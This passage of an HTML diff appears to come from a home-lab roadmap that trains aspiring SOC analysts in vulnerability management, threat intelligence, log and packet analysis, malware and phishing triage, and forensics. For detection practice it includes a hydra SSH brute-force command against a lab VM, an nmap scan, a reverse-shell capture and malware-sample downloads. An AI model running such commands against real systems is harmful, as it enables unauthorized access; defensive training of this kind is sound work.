+              <div class="step-desc">Review the scan results. Group by severity (Critical/High/Medium/Low). For each Critical and High finding: identify the CVE, CVSS base score, attack vector, and exploit availability. Look up at least 3 CVEs on <a href="https://nvd.nist.gov" target="_blank">NVD</a> to understand them deeply.</div>
+              <div class="step-tools"><span class="stool">CVSS v3.1</span><span class="stool">NVD</span><span class="stool">CVE Database</span></div>
+            </div>
+          </div>
+
+          <div class="step-item">
+            <div class="step-n sn-green">4</div>
+            <div class="step-content">
+              <div class="step-title">Build a remediation tracking spreadsheet</div>
+              <div class="step-desc">Create a spreadsheet with columns: CVE, Host, Severity, CVSS, Description, Recommended Fix, Owner, Status, Target Date, Verified Date. This is exactly what real Vulnerability Management teams maintain. Track at least 10 findings through to "Remediated" status.</div>
+              <div class="step-tools"><span class="stool">Excel/Sheets</span><span class="stool">Remediation Workflow</span></div>
+            </div>
+          </div>
+
+          <div class="step-item">
+            <div class="step-n sn-green">5</div>
+            <div class="step-content">
+              <div class="step-title">Patch + rescan + verify</div>
+              <div class="step-desc">Actually fix the vulnerabilities: <code>sudo apt update && sudo apt upgrade</code> on Ubuntu, Windows Update on Windows, configuration changes for misconfigurations. Re-run the scan. Confirm findings dropped. This proves you understand the full lifecycle: detect → triage → fix → verify.</div>
+            </div>
+          </div>
+
+          <div class="step-item">
+            <div class="step-n sn-green">6</div>
+            <div class="step-content">
+              <div class="step-title">Write a vulnerability assessment report</div>
+              <div class="step-desc">Produce a professional report: Executive Summary (1 paragraph for non-technical readers), Scope, Methodology, Findings (with CVSS + risk context), Recommendations, Remediation Timeline. Publish to GitHub. This is the exact deliverable a Cybersecurity Analyst produces for stakeholders.</div>
+              <div class="step-tools"><span class="stool">Technical Writing</span><span class="stool">Executive Reporting</span></div>
+            </div>
+          </div>
+
+        </div>
+
+        <div class="phase-intro" style="margin:0 18px 18px;padding:14px 16px;background:rgba(255,107,53,.04);border:1px solid rgba(255,107,53,.15);border-radius:8px;border-bottom:none;font-style:italic">
+          <strong style="color:var(--accent3);font-family:var(--mono);font-size:11px;letter-spacing:.06em;font-style:normal">INTERVIEW TRANSLATION</strong><br><br>
+          "I used Nessus to perform authenticated vulnerability scans against my lab environment, triaged findings by CVSS score, looked up CVEs on NVD to understand attack vectors and exploit availability, tracked remediation through a spreadsheet workflow, applied fixes, verified resolution with rescans, and produced a professional vulnerability assessment report including an executive summary for stakeholders."
+        </div>
+
+        <div class="goal-box"><strong>PHASE GOAL</strong>10+ findings tracked through full remediation lifecycle. Professional vulnerability assessment report published to GitHub.</div>
+      </div>
+    </div>
+
+    <!-- PHASE 09 -->
+    <div class="phase-block">
+      <div class="phase-hdr" onclick="togglePhase(this)">
+        <div class="phase-num pn-green">09</div>
+        <div class="phase-hdr-info">
+          <div class="phase-hdr-title">Threat Intelligence Operations</div>
+          <div class="phase-hdr-meta">TI feeds · IOC enrichment · vendor reports · ~3 hours</div>
+          <div class="phase-tags"><span class="ptag g">Cyber Analyst</span><span class="ptag">AlienVault OTX</span><span class="ptag">MISP</span><span class="ptag">IOCs</span><span class="ptag">MITRE ATT&CK</span></div>
+        </div>
+        <div class="phase-caret">▶</div>
+      </div>
+      <div class="phase-body">
+        <div class="phase-intro"><strong style="color:var(--accent2)">Why this matters:</strong> Threat intelligence is the analyst skill that turns a reactive SOC into a proactive one. Knowing how to consume, enrich, and act on TI is asked about in nearly every cybersecurity analyst interview. Free tooling makes this fully practiceable at home.</div>
+        <div class="steps-list">
+
+          <div class="step-item">
+            <div class="step-n sn-green">1</div>
+            <div class="step-content">
+              <div class="step-title">Subscribe to free threat intelligence feeds</div>
+              <div class="step-desc">Create free accounts on:<br>
+              → <a href="https://otx.alienvault.com" target="_blank">AlienVault OTX</a> — subscribe to 5+ pulses (e.g. APT groups, ransomware families)<br>
+              → <a href="https://urlhaus.abuse.ch" target="_blank">URLhaus</a> + <a href="https://bazaar.abuse.ch" target="_blank">MalwareBazaar</a> + <a href="https://threatfox.abuse.ch" target="_blank">ThreatFox</a> by Abuse.ch<br>
+              → <a href="https://www.misp-project.org" target="_blank">MISP</a> public feeds<br>
+              Set a daily review routine — even 15 minutes/day puts you ahead of most analysts.</div>
+            </div>
+          </div>
+
+          <div class="step-item">
+            <div class="step-n sn-green">2</div>
+            <div class="step-content">
+              <div class="step-title">Read 3 real vendor threat reports cover to cover</div>
+              <div class="step-desc">Pick 3 recent threat reports — examples: Mandiant M-Trends, CrowdStrike Global Threat Report, Microsoft Digital Defense Report, Talos, or Unit 42. Extract every IOC (IPs, domains, hashes, file paths, registry keys) into a structured table. Map each TTP to MITRE ATT&CK. This is exactly how TI analysts operationalize reports.</div>
+              <div class="step-tools"><span class="stool">Mandiant</span><span class="stool">CrowdStrike</span><span class="stool">Microsoft</span><span class="stool">MITRE ATT&CK</span></div>
+            </div>
+          </div>
+
+          <div class="step-item">
+            <div class="step-n sn-green">3</div>
+            <div class="step-content">
+              <div class="step-title">Build a personal IOC enrichment workflow</div>
+              <div class="step-desc">For every IOC you encounter, run a consistent enrichment process:<br>
+              → IP: VirusTotal + AbuseIPDB + Shodan + GreyNoise<br>
+              → Domain: VirusTotal + URLScan + WHOIS + age<br>
+              → Hash: VirusTotal + MalwareBazaar + Hybrid-Analysis<br>
+              → URL: URLScan + VirusTotal + URLhaus<br>
+              Document the workflow as a runbook in GitHub. Apply it consistently.</div>
+              <div class="step-tools"><span class="stool">VirusTotal</span><span class="stool">AbuseIPDB</span><span class="stool">Shodan</span><span class="stool">GreyNoise</span></div>
+            </div>
+          </div>
+
+          <div class="step-item">
+            <div class="step-n sn-green">4</div>
+            <div class="step-content">
+              <div class="step-title">Hunt for real-world IOCs in your lab</div>
+              <div class="step-desc">Take IOCs from one of the threat reports you read. Search your Elastic SIEM in Kibana Discover — try queries like:<br>
+              <code>destination.ip: ("1.2.3.4" OR "5.6.7.8")</code><br>
+              <code>process.hash.sha256: "abc123..."</code><br>
+              <code>dns.question.name: "evil-domain.com"</code><br>
+              Document hunts even if no hits. Convert any matching hunts to permanent Kibana detection rules.</div>
+              <div class="step-tools"><span class="stool">Kibana KQL</span><span class="stool">Hunt Documentation</span></div>
+            </div>
+          </div>
+
+          <div class="step-item">
+            <div class="step-n sn-green">5</div>
+            <div class="step-content">
+              <div class="step-title">Write a threat intelligence brief</div>
+              <div class="step-desc">Pick one threat actor or campaign (e.g. Scattered Spider, LockBit, APT29). Write a 1-page intelligence brief: Executive Summary, Threat Actor Overview, Recent Activity, TTPs (ATT&CK-mapped), IOCs, Recommended Defensive Actions. Publish to GitHub. This is THE deliverable threat intel analysts produce.</div>
+              <div class="step-tools"><span class="stool">Intelligence Briefing</span><span class="stool">Executive Summary</span></div>
+            </div>
+          </div>
+
+        </div>
+
+        <div class="phase-intro" style="margin:0 18px 18px;padding:14px 16px;background:rgba(255,107,53,.04);border:1px solid rgba(255,107,53,.15);border-radius:8px;border-bottom:none;font-style:italic">
+          <strong style="color:var(--accent3);font-family:var(--mono);font-size:11px;letter-spacing:.06em;font-style:normal">INTERVIEW TRANSLATION</strong><br><br>
+          "I consume threat intelligence daily from AlienVault OTX, Abuse.ch feeds, and major vendor reports. I extract IOCs and TTPs, map them to MITRE ATT&amp;CK, run threat hunts against my SIEM data using KQL, and produce threat intelligence briefs covering threat actor TTPs and recommended defensive actions."
+        </div>
+
+        <div class="goal-box"><strong>PHASE GOAL</strong>3 threat reports operationalized. IOC enrichment runbook published. 1 threat intelligence brief on GitHub. Active TI feed routine established.</div>
+      </div>
+    </div>
+
+        <!-- PHASE 10 -->
+    <div class="phase-block">
+      <div class="phase-hdr" onclick="togglePhase(this)">
+        <div class="phase-num pn-green">10</div>
+        <div class="phase-hdr-info">
+          <div class="phase-hdr-title">Security Analyst Fundamentals</div>
+          <div class="phase-hdr-meta">Windows hardening · IAM review · IR playbooks · security controls · ~5 hours</div>
+          <div class="phase-tags"><span class="ptag g">Cyber Analyst</span><span class="ptag">Hardening</span><span class="ptag">IAM Review</span><span class="ptag">IR Playbooks</span><span class="ptag">Controls</span></div>
+        </div>
+        <div class="phase-caret">▶</div>
+      </div>
+      <div class="phase-body">
+        <div class="phase-intro"><strong style="color:var(--accent2)">Why this matters:</strong> Cybersecurity Analyst roles are broader than SOC monitoring. They include endpoint hardening, access reviews, and playbook writing. This phase adds those skills so you qualify for Security Analyst, Junior Cybersecurity Analyst, and Cybersecurity Technician roles — not just pure SOC positions.</div>
+        <div class="steps-list">
+          <div class="step-item">
+            <div class="step-n sn-green">1</div>
+            <div class="step-content">
+              <div class="step-title">Windows Security Hardening Review</div>
+              <div class="step-desc">Review your Windows 10 VM against a security baseline. Check and document: Firewall (all profiles enabled?), Local users (any Guest/default accounts?), Password policy (length/complexity/lockout), RDP status (is it enabled?), Windows Defender (real-time protection), Auto-updates, and SMBv1 (legacy protocol — should be disabled). Document every finding in a checklist: Current State · Risk · Recommended Fix. Publish to GitHub.</div>
+              <div class="step-tools"><span class="stool">CIS Benchmark</span><span class="stool">Windows Security</span><span class="stool">Group Policy</span></div>
+            </div>
+          </div>
+          <div class="step-item">
+            <div class="step-n sn-green">2</div>
+            <div class="step-content">
+              <div class="step-title">IAM / Access Review</div>
+              <div class="step-desc">Audit all local accounts on your Windows VM: list users + group memberships, identify who is in Administrators (is each justified?), check for enabled accounts that shouldn't be, check last logins. Apply least privilege — does every account have only the access it needs? Produce an access review report: Account → Access Level → Business Justification → Status (Approved/Remove/Investigate). This is a real quarterly deliverable at most organizations.</div>
+              <div class="step-tools"><span class="stool">Least Privilege</span><span class="stool">Access Review</span><span class="stool">IAM Concepts</span></div>
+            </div>
+          </div>
+          <div class="step-item">
+            <div class="step-n sn-green">3</div>
+            <div class="step-content">
+              <div class="step-title">Write 6 Incident Response Playbooks</div>
+              <div class="step-desc">Write a step-by-step playbook for each alert type:<br>
+              1. Failed Login Spike · 2. Suspicious PowerShell · 3. New Local Admin Account · 4. Suricata IDS Alert · 5. Suspicious Outbound Connection · 6. Malware Detection Alert<br><br>
+              Each playbook: Alert Description → Initial Checks → Logs to Review → Questions to Answer → Escalation Criteria → Containment Recommendation → Documentation Requirements. Publish all 6 to GitHub.</div>
+              <div class="step-tools"><span class="stool">IR Playbooks</span><span class="stool">PICERL</span><span class="stool">GitHub Portfolio</span></div>
+            </div>
+          </div>
+          <div class="step-item">
+            <div class="step-n sn-green">4</div>
+            <div class="step-content">
+              <div class="step-title">Security Control Mapping</div>
+              <div class="step-desc">Map every lab component to a security control category and the ATT&amp;CK techniques it covers: Elastic SIEM → Logging &amp; Monitoring, Suricata → Network IDS, Sysmon → Endpoint Visibility, Firewall → Access Control, AD Policy → Authentication, Nessus → Vulnerability Management, Playbooks → Incident Response. Produce a one-page security controls document showing what each control defends against and any coverage gaps. Publish to GitHub.</div>
+              <div class="step-tools"><span class="stool">NIST CSF</span><span class="stool">CIS Controls v8</span><span class="stool">Defense-in-Depth</span></div>
+            </div>
+          </div>
+          <div class="step-item">
+            <div class="step-n sn-green">5</div>
+            <div class="step-content">
+              <div class="step-title">Write 2 professional security reports</div>
+              <div class="step-desc">Produce a Windows Hardening Report and an Access Review Report, each with: Executive Summary, Scope, Findings (with risk ratings), Recommendations, and Status. These are exactly the deliverables a Cybersecurity Analyst produces for management. Publish both to GitHub.</div>
+              <div class="step-tools"><span class="stool">Technical Writing</span><span class="stool">Executive Reporting</span></div>
+            </div>
+          </div>
+        </div>
+        <div class="phase-intro" style="margin:0 18px 18px;padding:14px 16px;background:rgba(255,107,53,.04);border:1px solid rgba(255,107,53,.15);border-radius:8px;border-bottom:none;font-style:italic">
+          <strong style="color:var(--accent3);font-family:var(--mono);font-size:11px;letter-spacing:.06em;font-style:normal">INTERVIEW TRANSLATION</strong><br><br>
+          "I practiced Security Analyst tasks including Windows hardening against CIS benchmarks, access reviews applying least privilege, writing six incident response playbooks, mapping controls to NIST CSF and CIS Controls, and producing professional security reports for stakeholders."
+        </div>
+        <div class="goal-box"><strong>PHASE GOAL</strong>Hardening checklist + access review report + 6 IR playbooks + security controls document + 2 professional reports — all on GitHub. Eligible for Cybersecurity Analyst roles, not just SOC.</div>
+      </div>
+    </div>
+        <!-- PHASE 11 -->
+    <div class="phase-block">
+      <div class="phase-hdr" onclick="togglePhase(this)">
+        <div class="phase-num pn-green">11</div>
+        <div class="phase-hdr-info">
+          <div class="phase-hdr-title">GRC &amp; Compliance Fundamentals</div>
+          <div class="phase-hdr-meta">NIST CSF · CIS Controls · risk register · compliance awareness · ~4 hours</div>
+          <div class="phase-tags"><span class="ptag g">Cyber Analyst</span><span class="ptag">NIST CSF</span><span class="ptag">Risk Register</span><span class="ptag">CIS Controls</span><span class="ptag">Compliance</span></div>
+        </div>
+        <div class="phase-caret">▶</div>
+      </div>
+      <div class="phase-body">
+        <div class="phase-intro"><strong style="color:var(--accent2)">Why this matters:</strong> Most Cybersecurity Analyst job descriptions mention frameworks, compliance, and risk. Security+ covers these theoretically but here you apply them practically against your actual lab environment. Hiring managers love candidates who can connect technical controls to business frameworks — it shows you think like a security professional, not just a tool operator.</div>
+        <div class="steps-list">
+          <div class="step-item">
+            <div class="step-n sn-green">1</div>
+            <div class="step-content">
+              <div class="step-title">Perform a NIST CSF self-assessment of your home lab</div>
+              <div class="step-desc">The NIST Cybersecurity Framework has 5 core functions: <strong>Identify, Protect, Detect, Respond, Recover</strong>. For each function, assess your lab:<br>
+              → <strong>Identify</strong>: do you have an asset inventory? (your VMs, their roles, their IPs)<br>
+              → <strong>Protect</strong>: what controls are in place? (Windows Firewall, Sysmon, hardening from Phase 10)<br>
+              → <strong>Detect</strong>: what detection capability exists? (Elastic SIEM, Wazuh, Suricata, Kibana dashboards)<br>
+              → <strong>Respond</strong>: do you have playbooks? (your 6 IR playbooks from Phase 10)<br>
+              → <strong>Recover</strong>: could you rebuild? (VM snapshots, documentation)<br>
+              Rate each function: Partial / Risk Informed / Repeatable / Adaptive. Write a one-page NIST CSF assessment report. Publish to GitHub.</div>
+              <div class="step-tools"><span class="stool">NIST CSF v2.0</span><span class="stool">Self-Assessment</span></div>
+            </div>
+          </div>
+          <div class="step-item">
+            <div class="step-n sn-green">2</div>
+            <div class="step-content">
+              <div class="step-title">Map your lab to CIS Controls v8</div>
+              <div class="step-desc">CIS Controls v8 has 18 controls. Map your lab components to the most relevant ones: Control 1 (Inventory), Control 2 (Software Inventory), Control 3 (Data Protection), Control 4 (Secure Configuration — your hardening from Phase 10), Control 5 (Account Management — IAM review), Control 6 (Access Control Management), Control 8 (Audit Log Management — Elastic SIEM), Control 10 (Malware Defenses — Wazuh/Defender), Control 12 (Network Infrastructure), Control 13 (Network Monitoring — Suricata). Document your coverage level and identify gaps. Publish to GitHub.</div>
+              <div class="step-tools"><span class="stool">CIS Controls v8</span><span class="stool">Controls Mapping</span></div>
+            </div>
+          </div>
+          <div class="step-item">
+            <div class="step-n sn-green">3</div>
+            <div class="step-content">
+              <div class="step-title">Build a risk register</div>
+              <div class="step-desc">Identify 10 realistic security risks in your lab environment. For each: Risk Description → Likelihood (1-5) → Impact (1-5) → Risk Score (Likelihood × Impact) → Current Controls → Residual Risk → Recommended Treatment (Mitigate/Accept/Transfer/Avoid). This is the exact format used in enterprise risk assessments. Publish the completed register as a spreadsheet or Markdown table on GitHub.</div>
+              <div class="step-tools"><span class="stool">Risk Matrix</span><span class="stool">Risk Register</span></div>
+            </div>
+          </div>
+          <div class="step-item">
+            <div class="step-n sn-green">4</div>
+            <div class="step-content">
+              <div class="step-title">Compliance framework awareness</div>
+              <div class="step-desc">Read the one-page summaries of these frameworks — not to be a practitioner but to speak intelligently in interviews:<br>
+              → <strong>HIPAA</strong>: healthcare data, PHI, Security Rule, Breach Notification<br>
+              → <strong>PCI-DSS</strong>: cardholder data, 12 requirements, scoping<br>
+              → <strong>SOC 2</strong>: Trust Services Criteria, Type I vs Type II, auditor reports<br>
+              → <strong>NIST 800-53</strong>: federal controls catalog, control families<br>
+              → <strong>ISO 27001</strong>: ISMS, Annex A controls, certification process<br>
+              Write a one-page "framework cheat sheet" covering each one in 3-4 sentences. Publish to GitHub. This directly answers the interview question "are you familiar with compliance frameworks?"</div>
+            </div>
+          </div>
+          <div class="step-item">
+            <div class="step-n sn-green">5</div>
+            <div class="step-content">
+              <div class="step-title">Write a security program gap analysis</div>
+              <div class="step-desc">Based on your NIST CSF assessment and CIS Controls mapping, write a gap analysis: what controls exist, what is missing, what is the risk of each gap, and what is the recommended remediation priority. Format it as an executive-ready 2-page document. This is a real deliverable Cybersecurity Analysts produce for leadership. Publish to GitHub.</div>
+            </div>
+          </div>
+        </div>
+        <div class="phase-intro" style="margin:0 18px 18px;padding:14px 16px;background:rgba(255,107,53,.04);border:1px solid rgba(255,107,53,.15);border-radius:8px;border-bottom:none;font-style:italic">
+          <strong style="color:var(--accent3);font-family:var(--mono);font-size:11px;letter-spacing:.06em;font-style:normal">INTERVIEW TRANSLATION</strong><br><br>
+          "I performed a NIST CSF self-assessment of my home lab, mapped controls to CIS Controls v8, built a risk register with likelihood and impact ratings, and produced a security program gap analysis. I can speak to HIPAA, PCI-DSS, SOC 2, NIST 800-53, and ISO 27001 at an awareness level."
+        </div>
+        <div class="goal-box"><strong>PHASE GOAL</strong>NIST CSF assessment + CIS Controls mapping + risk register + framework cheat sheet + gap analysis — all published to GitHub. You can now speak fluently to GRC topics in any Cybersecurity Analyst interview.</div>
+      </div>
+    </div>
+    <!-- TRACK 4 DIVIDER -->
+    <div class="track-divider">
+      <div class="track-divider-icon">🔬</div>
+      <div>
+        <div class="track-divider-title">Track 4 — Deep Investigation Skills</div>
+        <div class="track-divider-sub">Log forensics, network analysis, malware, digital forensics, and threat hunting — L2-level depth.</div>
+      </div>
+    </div>
+<!-- PHASE 12 -->
+    <div class="phase-block">
+      <div class="phase-hdr" onclick="togglePhase(this)">
+        <div class="phase-num pn-blue">12</div>
+        <div class="phase-hdr-info">
+          <div class="phase-hdr-title">Deep Log Analysis</div>
+          <div class="phase-hdr-meta">Windows Event IDs · Linux logs · Firewall logs · ~4 hours</div>
+          <div class="phase-tags"><span class="ptag">Event IDs</span><span class="ptag">auditd</span><span class="ptag">auth.log</span><span class="ptag">UFW</span><span class="ptag">Sysmon</span></div>
+        </div>
+        <div class="phase-caret">▶</div>
+      </div>
+      <div class="phase-body">
+        <div class="phase-intro">A SOC analyst reads logs all day. Windows events, Linux auth logs, firewall logs — you need to know what's normal and what's suspicious in each one without having to look things up.</div>
+        <div class="steps-list">
+          <div class="step-item">
+            <div class="step-n sn-blue">1</div>
+            <div class="step-content">
+              <div class="step-title">Memorize the critical Windows Event IDs</div>
+              <div class="step-desc">Trigger each one in your lab then find it in Kibana. Know these cold:<br><br>
+              <strong>Authentication:</strong> 4624 (login — note logon types: 2=local, 3=network, 10=RDP), 4625 (failed login), 4648 (explicit credentials used)<br>
+              <strong>Kerberos:</strong> 4768 (TGT requested), 4769 (service ticket — Kerberoasting), 4771 (pre-auth failure)<br>
+              <strong>Accounts:</strong> 4720 (user created), 4724 (password reset), 4728/4732 (added to group), 4756 (added to universal group)<br>
+              <strong>Process:</strong> 4688 (process created), 4689 (process exited)<br>
+              <strong>Persistence:</strong> 4698 (scheduled task created), 7045 (service installed)<br>
+              <strong>Sysmon:</strong> 1 (process create), 3 (network connect), 10 (process access/LSASS), 11 (file create), 13 (registry set)</div>
+            </div>
+          </div>
+          <div class="step-item">
+            <div class="step-n sn-blue">2</div>
+            <div class="step-content">
+              <div class="step-title">Analyze Linux logs on your Ubuntu VM</div>
+              <div class="step-desc">From Kali: run an SSH brute force: <code>hydra -l socadmin -P /usr/share/wordlists/rockyou.txt ssh://[ubuntu-ip]</code>. On Ubuntu check: <code>sudo tail -f /var/log/auth.log</code> — find the failed attempts with source IP and username. Install auditd: <code>sudo apt install auditd</code>. Add a file watch: <code>sudo auditctl -w /etc/passwd -p wa -k passwd_watch</code>. Modify the file → check: <code>sudo ausearch -k passwd_watch</code>. Forward auth.log to Elastic via Filebeat.</div>
+              <div class="step-tools"><span class="stool">auth.log</span><span class="stool">auditd</span><span class="stool">Filebeat</span></div>
+            </div>
+          </div>
+          <div class="step-item">
+            <div class="step-n sn-blue">3</div>
+            <div class="step-content">
+              <div class="step-title">Set up and analyze firewall logs</div>
+              <div class="step-desc">On Ubuntu: <code>sudo apt install ufw -y</code> → <code>sudo ufw logging on</code> → <code>sudo ufw enable</code>. From Kali run an nmap scan → check <code>sudo tail -f /var/log/ufw.log</code>. Understand the fields: SRC (source IP), DPT (destination port), PROTO (protocol). Signs of a port scan: multiple entries from same source with different destination ports in seconds. Forward UFW logs to Elastic. Build a Kibana dashboard showing top blocked IPs and targeted ports.</div>
+            </div>
+          </div>
+        </div>
+        <div class="goal-box"><strong>PHASE GOAL</strong>All critical Event IDs memorized. Linux and firewall logs in Kibana. Brute force and port scan detected in logs.</div>
+      </div>
+    </div>
+
+    <!-- PHASE 13 -->
+    <div class="phase-block">
+      <div class="phase-hdr" onclick="togglePhase(this)">
+        <div class="phase-num pn-blue">13</div>
+        <div class="phase-hdr-info">
+          <div class="phase-hdr-title">Network Traffic Analysis</div>
+          <div class="phase-hdr-meta">Wireshark · PCAP analysis · C2 detection · DNS tunneling · ~4 hours</div>
+          <div class="phase-tags"><span class="ptag">Wireshark</span><span class="ptag">tcpdump</span><span class="ptag">C2 Beaconing</span><span class="ptag">DNS Tunneling</span><span class="ptag">PCAP Forensics</span></div>
+        </div>
+        <div class="phase-caret">▶</div>
+      </div>
+      <div class="phase-body">
+        <div class="phase-intro">Every SOC alert has network evidence. You need to be able to open a packet capture and tell a story of what happened — who talked to who, what they sent, and whether it was malicious.</div>
+        <div class="steps-list">
+          <div class="step-item">
+            <div class="step-n sn-blue">1</div>
+            <div class="step-content">
+              <div class="step-title">Install Wireshark and capture your own attack traffic</div>
+              <div class="step-desc">Download <a href="https://www.wireshark.org/download.html" target="_blank">Wireshark</a> and install it on your host machine (not in a VM). On Kali while running your reverse shell attack: <code>tcpdump -i eth0 -w /tmp/attack.pcap</code>. Copy the PCAP to your host and open it in Wireshark. Filter: <code>ip.addr==[kali-ip] AND ip.addr==[win-ip]</code>. Find the Meterpreter C2 channel — look for a persistent TCP connection with regular data. Right-click → Follow → TCP Stream to see the tunnel.</div>
+              <div class="step-tools"><span class="stool">Wireshark</span><span class="stool">tcpdump</span></div>
+            </div>
+          </div>
+          <div class="step-item">
+            <div class="step-n sn-blue">2</div>
+            <div class="step-content">
+              <div class="step-title">Analyze real malware PCAPs with answer keys</div>
+              <div class="step-desc">Go to <a href="https://malware-traffic-analysis.net/training-exercises.html" target="_blank">malware-traffic-analysis.net</a> — download 5 exercise PCAPs (unzip password: <code>infected</code>). For each PCAP answer: What is the victim IP? What is the C2 IP? What protocol is the C2 using? Is there beaconing (periodic connections at regular intervals)? Was data exfiltrated? Check Statistics → Conversations to identify the most active connections. Check every external IP in VirusTotal. Compare your findings against the answer key. Write an incident report for each one.</div>
+              <div class="step-tools"><span class="stool">Wireshark</span><span class="stool">VirusTotal</span><span class="stool">AbuseIPDB</span></div>
+            </div>
+          </div>
+          <div class="step-item">
+            <div class="step-n sn-blue">3</div>
+            <div class="step-content">
+              <div class="step-title">Key Wireshark filters every SOC analyst should know</div>
+              <div class="step-desc">
+              <code>dns</code> → all DNS queries — look for long subdomains (tunneling)<br>
+              <code>http.request</code> → all HTTP requests — look for suspicious URIs<br>
+              <code>tcp.flags.syn==1 && tcp.flags.ack==0</code> → connection attempts<br>
+              <code>ip.addr==x.x.x.x</code> → all traffic to/from a specific IP<br>
+              <code>frame contains "password"</code> → search packet content<br>
+              <code>tcp.stream eq N</code> → follow a specific TCP conversation<br>
+              Practice using all of these on your lab PCAPs.
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="goal-box"><strong>PHASE GOAL</strong>5 malware PCAPs analyzed with written reports. You can identify C2 beaconing and DNS tunneling in a PCAP.</div>
+      </div>
+    </div>
+
+    <!-- PHASE 14 -->
+    <div class="phase-block">
+      <div class="phase-hdr" onclick="togglePhase(this)">
+        <div class="phase-num pn-blue">14</div>
+        <div class="phase-hdr-info">
+          <div class="phase-hdr-title">Malware Analysis + Phishing Investigation</div>
+          <div class="phase-hdr-meta">PEStudio · Any.run · MXToolbox · URLScan · ~4 hours</div>
+          <div class="phase-tags"><span class="ptag">PEStudio</span><span class="ptag">Any.run</span><span class="ptag">Static Analysis</span><span class="ptag">Phishing</span><span class="ptag">SPF/DKIM/DMARC</span></div>
+        </div>
+        <div class="phase-caret">▶</div>
+      </div>
+      <div class="phase-body">
+        <div class="phase-intro">Phishing investigation is the #1 most common L1 SOC task. Malware analysis lets you understand what a sample does before it causes damage. Learn both.</div>
+        <div class="steps-list">
+          <div class="step-item">
+            <div class="step-n sn-blue">1</div>
+            <div class="step-content">
+              <div class="step-title">Static malware analysis with PEStudio</div>
+              <div class="step-desc">Download <a href="https://www.winitor.com" target="_blank">PEStudio</a> on your Windows VM. Get safe malware samples from <a href="https://bazaar.abuse.ch" target="_blank">MalwareBazaar</a>. Only analyze inside your isolated VM. Open a sample in PEStudio and examine:<br>
+              → <strong>Indicators tab:</strong> PEStudio flags suspicious items automatically<br>
+              → <strong>Imports tab:</strong> dangerous APIs to look for: CreateRemoteThread, WriteProcessMemory (injection), VirtualAlloc (shellcode)<br>
+              → <strong>Strings tab:</strong> hardcoded IPs, domains, file paths, registry keys<br>
+              → <strong>Sections tab:</strong> entropy above 7 = packed or encrypted<br>
+              Check the file hash on VirusTotal. Write a report: hash, suspicious imports, IOCs found, verdict.</div>
+              <div class="step-tools"><span class="stool">PEStudio</span><span class="stool">VirusTotal</span><span class="stool">MalwareBazaar</span></div>
+            </div>
+          </div>
+          <div class="step-item">
+            <div class="step-n sn-blue">2</div>
+            <div class="step-content">
+              <div class="step-title">Dynamic malware analysis in Any.run sandbox</div>
+              <div class="step-desc">Go to <a href="https://any.run" target="_blank">any.run</a> (free account, browser-based). Upload a malware sample → click Run → watch it execute live. Document:<br>
+              → What processes were created?<br>
+              → What network connections were made? (C2 IPs and domains)<br>
+              → What files were dropped?<br>
+              → What registry keys were written?<br>
+              → Click the ATT&CK Matrix tab — see what techniques were identified automatically<br>
+              Export all IOCs: IPs, domains, hashes, file paths. Write a dynamic analysis report.</div>
+              <div class="step-tools"><span class="stool">Any.run</span><span class="stool">VirusTotal</span><span class="stool">MITRE ATT&CK</span></div>
+            </div>
+          </div>
+          <div class="step-item">
+            <div class="step-n sn-blue">3</div>
+            <div class="step-content">
+              <div class="step-title">Phishing email investigation — full workflow</div>
+              <div class="step-desc">Download real phishing samples from <a href="https://github.com/rf-peixoto/phishing_pot" target="_blank">github.com/rf-peixoto/phishing_pot</a>. For each sample follow this exact process:<br><br>
+              <strong>Step 1 — Headers:</strong> paste into <a href="https://mxtoolbox.com/EmailHeaders.aspx" target="_blank">mxtoolbox.com/EmailHeaders.aspx</a> → check SPF, DKIM, DMARC pass/fail. Is Reply-To different from From?<br>
+              <strong>Step 2 — Sender domain:</strong> run whois → was the domain registered in the last 30 days?<br>
+              <strong>Step 3 — URLs:</strong> paste every URL into <a href="https://urlscan.io" target="_blank">urlscan.io</a> AND VirusTotal<br>
+              <strong>Step 4 — Attachment:</strong> upload to any.run → read sandbox report<br>
+              <strong>Step 5 — IOC table:</strong> list all malicious IPs, domains, hashes<br>
+              <strong>Step 6 — Write report</strong> and save to GitHub<br><br>
+              Do this for 5 different samples. One report per sample.</div>
+              <div class="step-tools"><span class="stool">MXToolbox</span><span class="stool">URLScan.io</span><span class="stool">Any.run</span><span class="stool">VirusTotal</span><span class="stool">whois</span></div>
+            </div>
+          </div>
+        </div>
+        <div class="goal-box"><strong>PHASE GOAL</strong>3 malware samples analyzed (static + dynamic). 5 phishing investigation reports in GitHub.</div>
+      </div>
+    </div>
+
+        <!-- PHASE 15 -->
+    <div class="phase-block">
+      <div class="phase-hdr" onclick="togglePhase(this)">
+        <div class="phase-num pn-blue">15</div>
+        <div class="phase-hdr-info">
+          <div class="phase-hdr-title">Digital Forensics &amp; Memory Analysis</div>
+          <div class="phase-hdr-meta">Volatility · FTK Imager · Autopsy · YARA · disk &amp; memory forensics · ~6 hours</div>
+          <div class="phase-tags"><span class="ptag">Volatility</span><span class="ptag">FTK Imager</span><span class="ptag">Autopsy</span><span class="ptag">YARA</span><span class="ptag">Memory Forensics</span><span class="ptag">DFIR</span></div>
+        </div>
+        <div class="phase-caret">▶</div>
+      </div>
+      <div class="phase-body">
+        <div class="phase-intro"><strong style="color:var(--accent2)">Why this matters:</strong> When a machine gets compromised, L2 analysts do not just read SIEM alerts — they image the disk, pull memory, and extract artifacts from the raw evidence. Digital forensics is one of the clearest skill separators between L1 and L2. Most L1 candidates have never touched Volatility or Autopsy. Having both gives you a direct path to L2 and IR analyst roles.</div>
+        <div class="steps-list">
+          <div class="step-item">
+            <div class="step-n sn-blue">1</div>
+            <div class="step-content">
+              <div class="step-title">Memory acquisition with WinPmem</div>
+              <div class="step-desc">Download <a href="https://github.com/Velocidex/WinPmem/releases" target="_blank">WinPmem</a> on your Windows VM. Run as Administrator: <code>winpmem_mini_x64.exe memdump.raw</code>. This creates a raw memory image of your running Windows system. Transfer the file to your Ubuntu or Kali VM for analysis. This is the first step in any live forensics investigation — acquire before anything changes.</div>
+              <div class="step-tools"><span class="stool">WinPmem</span><span class="stool">Memory Acquisition</span></div>
+            </div>
+          </div>
+          <div class="step-item">
+            <div class="step-n sn-blue">2</div>
+            <div class="step-content">
+              <div class="step-title">Memory analysis with Volatility 3</div>
+              <div class="step-desc">Install Volatility 3 on Kali: <code>git clone https://github.com/volatilityfoundation/volatility3 && pip3 install -r requirements.txt</code>. Analyze your memory dump:<br>
